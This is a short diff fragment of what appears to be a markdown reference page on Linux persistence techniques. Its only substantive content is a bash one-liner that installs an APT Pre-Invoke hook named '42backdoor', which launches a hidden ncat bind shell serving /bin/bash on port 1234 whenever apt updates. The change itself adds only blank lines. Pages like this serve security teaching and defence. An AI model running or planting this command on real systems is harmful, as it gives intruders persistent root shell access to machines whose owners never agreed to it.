@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:34:19.269757+00:00'
 ```bash
 echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &"};' > /etc/apt/apt.conf.d/42backdoor
 ```
+
+
